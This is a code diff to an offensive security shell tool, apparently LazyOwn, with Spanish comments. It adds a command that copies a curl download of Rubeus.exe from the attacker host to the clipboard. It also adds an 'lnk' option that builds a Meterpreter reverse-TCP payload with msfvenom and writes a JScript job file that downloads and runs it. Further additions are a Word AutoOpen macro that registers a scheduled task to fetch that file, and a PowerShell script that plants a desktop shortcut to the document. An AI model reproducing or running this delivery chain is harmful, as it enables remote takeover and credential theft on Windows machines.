@@ -1564,7 +1564,7 @@ class LazyOwnShell(Cmd):
         return
     def do_clean(self, line):
         """delete all from sessions"""
-        os.system("rm sessions/*.ps1 sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* -rf")
+        os.system("rm sessions/*.ps1 sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* -rf")
         print(f"{GREEN}[*]{YELLOW} cleanned sessions directory. {RESET}")
         return
 
@@ -1573,6 +1573,16 @@ class LazyOwnShell(Cmd):
         aliases = LazyOwnShell().aliases
         for alias, command in aliases.items():
             print(f"[>]{WHITE} Alias {GREEN} {alias}{WHITE} : Full command: {CYAN}{command}{RESET} ")
+        return
+    def do_rubeus(self,line):
+        """copia a la clipboard la borma de descargar Rubeus"""
+        lhost = self.params["lhost"]
+        if not lhost:
+            print(f"{YELLOW}[-] lhost must be set use set lhost <ip>{RESET}")
+            return
+        
+        print(f"{GREEN}[*]{YELLOW} Rubeus downloader (echo 'cmd.exe /c curl -OJ http://{lhost}/Rubeus.exe' | xclip -sel clip) copied to clipboard. {RESET}")
+        os.system(f"echo 'cmd.exe /c curl -OJ http://{lhost}/Rubeus.exe' | xclip -sel clip")
         return
 
     def do_msf(self, line):
@@ -1656,6 +1666,71 @@ class LazyOwnShell(Cmd):
             # Eliminar el archivo temporal
             os.remove(rc_file_path)
             return
+        elif line.startswith("lnk"):
+            # Parámetros necesarios
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+            if not lhost or not lport:
+                print(f"{YELLOW}[-] lhost or lport must be set use set lhost <ip>{RESET}")
+                return
+            # Aquí deberías configurar tu IP y otros parámetros necesarios
+            lhost = f"{lhost}"  # Reemplaza con tu dirección IP
+            lport = f"{lport}"  # Puedes cambiar el puerto si lo necesitas
+            
+            web_root = "sessions"
+            docx_path = "C:\\users\\public\\downloads\\Document.docx"  # Ruta al documento de Office
+
+            if not lhost or not lport:
+                print("[-] lhost o lport deben estar establecidos. Usa 'set lhost <ip>'")
+            else:
+                # Paso 1: Crear el payload con msfvenom
+                payload_path = os.path.join(web_root, "payload.exe")
+                msfvenom_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
+                subprocess.run(msfvenom_cmd, shell=True, check=True)
+                print("[+] Payload creado con éxito en", payload_path)
+
+                # Paso 2: Crear el archivo XML para la descarga
+                xml_content = f"""<?xml version="1.0"?>
+                <job>
+                <script language="JScript">
+                    var objShell = new ActiveXObject("WScript.Shell");
+                    var objExec = objShell.Exec("cmd.exe /c powershell -Command \\"Invoke-WebRequest -Uri 'http://{lhost}/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\\"");
+                </script>
+                </job>
+                """
+                xml_path = os.path.join(web_root, "download_payload.xml")
+                with open(xml_path, 'w') as xml_file:
+                    xml_file.write(xml_content)
+                print("[+] Archivo XML creado con éxito en", xml_path)
+
+                # Paso 3: Crear la macro en un documento de Office (contenido de la macro)
+                macro_content = f"""
+                Sub AutoOpen()
+                    CreateObject("WScript.Shell").Run "powershell -Command \\"Invoke-WebRequest -Uri 'http://{lhost}/download_payload.xml' -OutFile 'C:\\Windows\\Temp\\download_payload.xml'; schtasks /create /tn 'DownloadPayload' /xml 'C:\\Windows\\Temp\\download_payload.xml' /f; schtasks /run /tn 'DownloadPayload'\\""
+                End Sub
+                """
+                # Este paso debe realizarse manualmente: Inserta la macro en tu documento de Office y guárdalo en la ruta especificada.
+                print(f"[+] Asegúrate de que el documento de Office con la macro esté en: {docx_path}")
+
+                # Paso 4: Crear el archivo .lnk con PowerShell
+                ps_script_content = f"""
+                $WshShell = New-Object -ComObject WScript.Shell
+                $Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\\Desktop\\Document.lnk")
+                $Shortcut.TargetPath = "{docx_path}"
+                $Shortcut.Save()
+                """
+                ps_script_path = os.path.join("sessions", "create_lnk.ps1")
+                with open(ps_script_path, 'w') as ps_script_file:
+                    ps_script_file.write(ps_script_content)
+                
+                print(f"[+] Script de PowerShell creado en {ps_script_path}")
+                print("[+] Ejecuta este script en la máquina Windows para crear el archivo .lnk")
+
+                # Nota: Este paso debe ejecutarse en la máquina Windows
+                cmd = """echo 'powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
+                print(f"[+] El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web")
+                os.system(cmd)
+                return
 
     def do_encrypt(self, line):
         """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
